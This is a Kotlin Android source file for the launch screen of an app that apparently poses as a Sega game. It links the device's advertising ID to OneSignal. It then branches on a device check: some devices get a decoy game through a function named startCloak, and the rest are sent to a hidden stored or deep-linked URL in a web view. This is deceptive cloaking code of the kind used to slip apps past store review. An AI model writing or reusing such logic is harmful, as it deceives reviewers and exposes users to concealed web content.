package com.sega.soni.activities

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import androidx.core.splashscreen.SplashScreen.Companion.installSplashScreen
import androidx.databinding.DataBindingUtil
import androidx.datastore.preferences.preferencesDataStore
import androidx.lifecycle.ViewModelProvider
import androidx.lifecycle.lifecycleScope
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import com.sega.soni.R
import com.sega.soni.Util.Checker
import com.sega.soni.databinding.LoadingActivityBinding
import com.sega.soni.viewmodel.BookViewModel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

val Context.dataStore by preferencesDataStore(name = "prefs")

class LoadingActivity : AppCompatActivity() {

    private lateinit var binding: LoadingActivityBinding
    private val checker = Checker()
    lateinit var myViewModel: BookViewModel
    lateinit var url: String
    override fun onCreate(savedInstanceState: Bundle?) {
        val splashScreen = installSplashScreen()
        super.onCreate(savedInstanceState)
        binding = DataBindingUtil.setContentView(this, R.layout.loading_activity)
        myViewModel = ViewModelProvider(this)[BookViewModel::class.java]

        lifecycleScope.launch(Dispatchers.IO) {

            val gadId =
                AdvertisingIdClient.getAdvertisingIdInfo(application.applicationContext).id.toString()
            OneSignal.initWithContext(application.applicationContext)
            OneSignal.setAppId(this@LoadingActivity.getString(R.string.onesignal_id))
            OneSignal.setExternalUserId(gadId)
        }
        if (checker.isDeviceSecured(this@LoadingActivity)) {
            startCloak()
        } else {
            lifecycleScope.launch(Dispatchers.IO) {
                val dataStore = myViewModel.checkUrl(DATASTORE_KEY, applicationContext)
                if (dataStore.isNullOrEmpty()) {
                    myViewModel.getDeepLink(this@LoadingActivity)
                    lifecycleScope.launch(Dispatchers.Main) {
                        myViewModel.urlLiveData.observe(this@LoadingActivity) {
                            startWeb(it)
                        }
                    }
                } else {
                    lifecycleScope.launch(Dispatchers.Main) {
                        startWeb(dataStore.toString())
                    }
                }
            }
        }
    }

    private fun startCloak() {
        with(Intent(this, StartGameActivity::class.java)) {
            startActivity(this)
            this@LoadingActivity.finish()
        }
    }

    private fun startWeb(url: String) {
        with(Intent(this, WebActivity::class.java)) {
            this.putExtra(EXTRA_NAME, url)
            startActivity(this)
            this@LoadingActivity.finish()
        }
    }

    companion object {
        const val EXTRA_NAME = "url"
        const val DATASTORE_KEY = "finalUrl"
    }
}